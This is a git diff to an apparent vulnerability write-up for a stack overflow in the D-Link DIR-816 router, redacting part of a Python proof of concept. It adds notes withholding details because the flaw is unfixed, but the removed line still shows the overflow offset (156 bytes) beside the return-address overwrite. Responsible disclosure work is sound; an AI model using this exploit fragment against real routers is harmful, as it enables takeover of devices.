@@ -25,6 +25,7 @@ After running the poc, we easily get the shell.
 ![image](https://github.com/RootSoull/Vuln-Poc/blob/master/D-Link/DIR-816/GETSHELL.png)
 
 # POC
+More details, as the manufacturer did not fix, will not be disclosed here.
 ```python
 #!/usr/bin/env python
 # POC code reference: https://github.com/PAGalaxyLab/VulInfo/tree/master/D-Link/DIR-816/stack_overflow_1
@@ -44,9 +45,10 @@ print 'tokenid is %s' % tokenid
 # The return address will be overwritten as newRet 
 newRet = '\x00\x00\x00\x00'
 
+#More details, as the manufacturer did not fix, will not be disclosed here.
+pBuf=''
 
-
-pMy= "L"*156+ newRet
+pMy= "L"*xx+ newRet
 
 rn = "\r\n"
 padding = "\x00\x00\x00\x00"
